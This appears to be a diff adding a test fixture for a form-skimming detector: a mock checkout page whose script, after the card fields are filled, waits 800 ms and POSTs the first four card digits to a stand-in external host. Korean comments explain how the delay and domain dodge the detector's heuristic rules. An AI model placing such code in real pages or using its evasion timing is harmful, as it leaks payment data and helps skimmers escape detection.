@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ambiguous External Request - E2E Test</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      max-width: 500px;
+      margin: 50px auto;
+      padding: 20px;
+      background: #f5f5f5;
+    }
+    .payment-form {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    h1 {
+      color: #333;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 500;
+      color: #555;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    .row {
+      display: flex;
+      gap: 15px;
+    }
+    .row .form-group {
+      flex: 1;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #2196f3;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .badge {
+      display: inline-block;
+      padding: 4px 8px;
+      background: #e3f2fd;
+      color: #1565c0;
+      border-radius: 4px;
+      font-size: 12px;
+      margin-bottom: 20px;
+    }
+    #status {
+      margin-top: 12px;
+      font-size: 13px;
+      color: #888;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="payment-form">
+    <span class="badge">TEST: Ambiguous External Request (UNKNOWN scenario)</span>
+    <h1>Order Checkout</h1>
+
+    <form id="paymentForm" data-testid="payment-form">
+      <div class="form-group">
+        <label for="cardholderName">Cardholder Name</label>
+        <input
+          type="text"
+          id="cardholderName"
+          name="cardholderName"
+          autocomplete="cc-name"
+          placeholder="John Doe"
+          data-testid="name"
+        />
+      </div>
+
+      <div class="form-group">
+        <label for="cardNumber">Card Number</label>
+        <input
+          type="text"
+          id="cardNumber"
+          name="cardNumber"
+          autocomplete="cc-number"
+          placeholder="1234 5678 9012 3456"
+          data-testid="card-number"
+          maxlength="19"
+        />
+      </div>
+
+      <div class="row">
+        <div class="form-group">
+          <label for="expiryDate">Expiry Date</label>
+          <input
+            type="text"
+            id="expiryDate"
+            name="expiryDate"
+            autocomplete="cc-exp"
+            placeholder="MM/YY"
+            data-testid="expiry"
+          />
+        </div>
+        <div class="form-group">
+          <label for="cvv">CVV</label>
+          <input
+            type="password"
+            id="cvv"
+            name="cvv"
+            autocomplete="cc-csc"
+            placeholder="123"
+            data-testid="cvv"
+          />
+        </div>
+      </div>
+
+      <button type="submit" data-testid="submit-btn">Place Order</button>
+    </form>
+
+    <div id="status"></div>
+  </div>
+
+  <!--
+    시나리오: 카드 입력 완료 후 800ms 뒤 외부 미분류 도메인으로 fetch 전송
+    - D001 불발: 500ms 초과 (800ms 지연)
+    - D002/D003 불발: MALICIOUS_PATTERNS, SUSPICIOUS_CDN_PATTERNS 미해당 도메인
+    - D004/D005 불발: analytics 서비스 아님, beacon 아님
+    - S001/S002/S003 불발: 신뢰 결제 게이트웨이 아님, 외부 도메인, analytics 아님
+    → 휴리스틱 UNKNOWN → AI 프록시 서버 호출
+  -->
+  <script data-testid="ambiguous-script">
+    (function () {
+      'use strict';
+
+      var EXTERNAL_URL = 'http://external-data-collector.io/collect';
+      var inputTimestamps = {};
+      var sentRequest = false;
+      var status = document.getElementById('status');
+
+      function updateStatus(msg) {
+        if (status !== null) status.textContent = msg;
+      }
+
+      function allFieldsFilled() {
+        var card = document.getElementById('cardNumber');
+        var cvv = document.getElementById('cvv');
+        var expiry = document.getElementById('expiryDate');
+        return (
+          card !== null && card.value.replace(/\s/g, '').length >= 15 &&
+          cvv !== null && cvv.value.length >= 3 &&
+          expiry !== null && expiry.value.length >= 4
+        );
+      }
+
+      function sendAmbiguousRequest() {
+        if (sentRequest) return;
+        sentRequest = true;
+
+        var card = document.getElementById('cardNumber');
+        var payload = JSON.stringify({
+          session: 'ord-' + Date.now(),
+          card_partial: card !== null ? card.value.slice(0, 4) : '',
+          ts: Date.now()
+        });
+
+        updateStatus('Sending to external service…');
+
+        // fetch 전송 — CORS 오류는 예상된 것이며 테스트에 영향 없음
+        fetch(EXTERNAL_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: payload
+        }).catch(function () {
+          /* network error expected */
+        });
+
+        updateStatus('Request sent at ' + new Date().toISOString());
+      }
+
+      document.querySelectorAll('input').forEach(function (input) {
+        input.addEventListener('input', function () {
+          inputTimestamps[input.id] = Date.now();
+
+          if (allFieldsFilled()) {
+            // 800ms 지연: D001(500ms 기준) 초과 → 휴리스틱 UNKNOWN 유도
+            setTimeout(sendAmbiguousRequest, 800);
+          }
+        });
+      });
+    })();
+  </script>
+</body>
+</html>
